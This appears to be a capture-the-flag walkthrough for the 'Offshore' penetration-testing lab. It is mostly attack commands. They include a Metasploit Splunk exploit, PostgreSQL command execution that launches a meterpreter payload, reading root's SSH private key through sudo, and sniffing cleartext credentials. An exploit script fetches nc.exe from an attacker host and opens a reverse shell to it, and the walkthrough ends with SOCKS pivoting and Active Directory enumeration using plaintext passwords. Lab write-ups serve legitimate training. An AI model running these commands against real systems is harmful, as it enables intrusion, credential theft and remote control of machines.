# Offshore

<figure><img src="../../../../.gitbook/assets/ic-offshore-overview.svg" alt=""><figcaption></figcaption></figure>

## Summary

* **Machines** - 21
* **Flags** - 38
* **Difficulty** - Advanced
* **Penetration Tester** - Level 3
* **Entry Point** - 10.10.110.0/24

## Entry Points

```bash
# Reachable Hosts & Ports
10.10.110.3
PORT    STATE SERVICE  REASON  VERSION
443/tcp open  ssl/http syn-ack nginx

10.10.110.123
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
8000/tcp open  http     syn-ack Splunkd httpd
8089/tcp open  ssl/http syn-ack Splunkd httpd (free license; remote login disabled)

10.10.110.124
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 10.0
```

## Flags

```
NIX01 - Just gettin' started - OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
```

## NIX01 - 172.16.1.23

### User - Mark

<pre class="language-bash"><code class="lang-bash"><strong>use exploit/multi/http/splunk_upload_app_exec
</strong>set target 1
run
python3 -c 'import pty;pty.spawn("/bin/bash")'
</code></pre>

### Privilege Escalation #1 - postgres

```bash
# Login to postgresql
/usr/local/pgsql/bin/psql -U postgres
# Command Execution run meterpreter shell
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '/dev/shm/shell.elf';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
# Flag
Wanna see some magic? - OFFSHORE{fun_w1th_m@g1k_bl0ck$}
```

### Privilege Escalastion #2 - root

```bash
# Read root private ssh key and save to id_rsa
sudo /usr/bin/tail -n 999 /root/.ssh/id_rsa
# Change id_rsa permissions
chmod 600 id_rsa
# Login as root
ssh root@$ip -i id_rsa
# Flag
I can see all things - OFFSHORE{st0p_tai1ing_m3_br0}
```

Post Enumeration

{% code overflow="wrap" %}
```bash
# Dump network traffic
tcpdump -i eth0 -w cap.pca
# Find Post request with password
HTTP/1.1 100 Continue

POST /apiclient/login.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.5066
Content-Type: application/x-www-form-urlencoded
Host: 172.16.1.23
Content-Length: 79
Expect: 100-continue
Connection: Keep-Alive

username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!HTTP/1.1 404 Not Found
Date: Mon, 17 Apr 2023 09:53:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 273
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
# Get another flag
Nothing to see here - OFFSHORE{l0v3_cl3artext_pr0toc0l$}
```
{% endcode %}

## Setup Pivot #1

```bash
# Setup Proxy
ssh -D 1080 root@$ip -fN -i id_rsa
# Confirm Proxy is running
lsof -i :1080
```

## MS01 - 172.16.1.30

{% code overflow="wrap" %}
```bash
# Run exploit
proxychains python3 47255.py -t http://172.16.1.30 -u admin -p 'Zaq12wsx!' -c 'powershell wget http://10.10.16.118/nc.exe -Outfile nc.exe'

proxychains python3 47255.py -t http://172.16.1.30 -u admin -p 'Zaq12wsx!' -c 'nc.exe -e cmd.exe 10.10.16.118 53'

But I read it was secure - OFFSHORE{p@ssw0rds_1n_cl3ar_t3xT}
All powerful, all knowing - OFFSHORE{RC3_a$_@_s3rv1c3}
```
{% endcode %}

## Active Directory Enumeration #1

{% code overflow="wrap" %}
```bash
proxychains bloodhound-python -d ned.flanders_adm -u ned.flanders_adm -p 'Lefthandedyeah!' -dc dc01.corp.local -c DCOnly -ns 172.16.1.5 --dns-tcp 
```
{% endcode %}
